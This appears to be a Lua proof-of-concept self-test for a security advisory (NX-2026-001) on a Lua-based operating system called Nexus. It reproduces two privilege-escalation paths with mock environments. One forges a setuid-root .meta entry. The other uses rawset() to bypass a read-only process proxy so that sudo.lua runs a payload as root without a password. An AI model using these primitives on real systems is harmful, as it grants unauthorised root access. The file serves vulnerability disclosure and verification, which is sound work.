-- NV-2026-001 host-side checks for the NX-16 and NX-17 primitives.
--
-- This does not run Nexus. It uses the real sudo.lua and permission.lua with a
-- small mock environment so the two decision points can be reproduced on a
-- workstation:
--
--   lua security/poc/selftest.lua
--
-- The NX-17 check copies the same lock() shape as src/env.lua and shows that
-- rawset() on the shared proxy changes what sudo.lua sees. The NX-16 check
-- round-trips the .meta line format and the setuid decision in process.exec().

local function read(path)
    local file = assert(io.open(path, "r"))
    local content = file:read("*a")
    file:close()
    return content
end

local function check_nx16()
    local permission = assert(load(read("src/permission.lua") .. "\nreturn permission"))()

    local function write_line(name, vtype, hash, mtime, btime, mode, refcount, uid, gid, link)
        return string.format("%s:%s:%d:%d:%d:%d:%d:%d:%d:%s",
            name, vtype, hash, mtime, btime, mode, refcount, uid, gid, link or "")
    end

    local function parse_line(line)
        local name, vtype, hash, mtime, btime, mode, refcount, uid, gid, link =
            string.match(line, "^([^:]+):([^:]+):(%d+):(%d+):(%d+):(%d+):(%d+):(%d+):(%d+):?(.*)")
        if not name then return nil end
        return {
            name = name, vtype = vtype, hash = tonumber(hash), mtime = tonumber(mtime),
            btime = tonumber(btime), mode = tonumber(mode), refcount = tonumber(refcount),
            uid = tonumber(uid), gid = tonumber(gid), link = link,
        }
    end

    local forged = write_line("nx16_payload.lua", "VREG", 123456, 100, 100, 4755, 1, 0, 0, "")
    local parsed = assert(parse_line(forged), "forged .meta line must parse")
    assert(parsed.mode == 4755 and parsed.uid == 0 and parsed.gid == 0, "forged fields")
    assert(permission.canSetUID(parsed.mode), "4755 must set the setuid bit")
    assert(permission.canOtherExec(parsed.mode), "4755 must be executable by others")

    -- src/process.lua L283-286: the setuid bit selects the file owner as euid.
    local euid = 100
    if permission.canSetUID(parsed.mode) then euid = parsed.uid end
    assert(euid == 0, "exec must switch euid to the forged owner")

    print("NX-16: .meta line parses and 4755 selects euid 0 (" .. permission.toText(parsed.mode) .. ")")
end

local function check_nx17()
    local sudo_source = read("root/usr/bin/sudo.lua")
    local argparse_source = read("root/usr/lib/argparse.lua")

    -- Same shape as src/env.lua lock().
    local function lock(tbl, name)
        return setmetatable({}, {
            __metatable = name,
            __index = tbl,
            __newindex = function() error(name .. " is read-only", 2) end,
            __pairs = function() return next, tbl, nil end,
        })
    end

    local events, stdout, stderr = {}, {}, {}
    local credentials = { uid = 100, euid = 0, gid = 100, egid = 0 }
    local environment = { USER = "debug", HOME = "/home/debug" }
    local files = {
        ["/etc/passwd"] = "root:x:0:0:root:/root:/bin/sh.lua\ndebug:x:100:100:Debug:/home/debug:/bin/sh.lua\n",
        ["/etc/group"] = "root:0:root\nsudo:27:debug\n",
        ["/etc/sudoers"] = "root ALL=(root) ALL\n",
        ["/usr/lib/argparse.lua"] = argparse_source,
    }

    local api = {
        getCurrent = function() return credentials end,
        setuser = function(account)
            events[#events + 1] = { "setuser", account.uid }
            credentials.uid, credentials.euid, credentials.suid = 0, 0, 0
            credentials.gid, credentials.egid, credentials.sgid = 0, 0, 0
            return true
        end,
        cwd = function() return "/work" end,
        getEnviron = function() return environment end,
        setEnviron = function(key, value) environment[key] = value end,
        exec = function(path, args)
            events[#events + 1] = { "exec", path, args, credentials.uid, credentials.euid }
            return 42
        end,
        wait = function() return nil end,
    }
    local process_proxy = lock(api, "process")

    -- The NX-17 step: rawset() bypasses the proxy's __newindex guard.
    rawset(process_proxy, "getCurrent", function()
        return { uid = 0, euid = 0, gid = 0, egid = 0 }
    end)

    local filesystem = {
        attributes = function(path)
            if not files[path] then return nil end
            return { type = "VREG", uid = 0, mode = 644 }
        end,
        open = function(path)
            local content = files[path]
            if not content then return nil, "missing" end
            return { readAll = function() return content end, close = function() end }
        end,
        exists = function(path) return path == "/usr/bin/payload.lua" end,
        isDirectory = function() return false end,
    }
    local user_api = {
        checkPasswordCorrect = function()
            events[#events + 1] = { "password-called" }
            return false
        end,
    }

    local env = setmetatable({
        require = function(name)
            if name == "process" then return process_proxy end
            if name == "filesystem" then return filesystem end
            if name == "user" then return user_api end
            error("unexpected require: " .. name)
        end,
        load = function(source, name, mode, load_env) return load(source, name, mode, load_env) end,
        io = {
            write = function(...)
                for i = 1, select("#", ...) do stdout[#stdout + 1] = tostring(select(i, ...)) end
            end,
            read = function() events[#events + 1] = { "read" }; return nil end,
            stderr = {
                write = function(_, ...)
                    for i = 1, select("#", ...) do stderr[#stderr + 1] = tostring(select(i, ...)) end
                end,
            },
        },
        os = { exit = function(code) error({ exit = code }) end },
    }, { __index = _G })

    local chunk = assert(load(sudo_source, "sudo.lua", "t", env))
    local ok, err = pcall(function() chunk("payload.lua") end)
    assert(ok, "sudo should succeed: " .. tostring(err))

    local exec_event
    for _, event in ipairs(events) do
        assert(event[1] ~= "read", "sudo must not prompt for a password")
        assert(event[1] ~= "password-called", "sudo must not call checkPasswordCorrect")
        if event[1] == "exec" then exec_event = event end
    end
    assert(exec_event, "sudo must execute the command")
    assert(exec_event[2] == "/usr/bin/payload.lua", "unexpected command: " .. tostring(exec_event[2]))
    assert(exec_event[4] == 0 and exec_event[5] == 0, "command must run with uid/euid 0")

    print("NX-17: sudo executed the payload as root without a password")
end

check_nx16()
check_nx17()
print("all host-side checks passed")
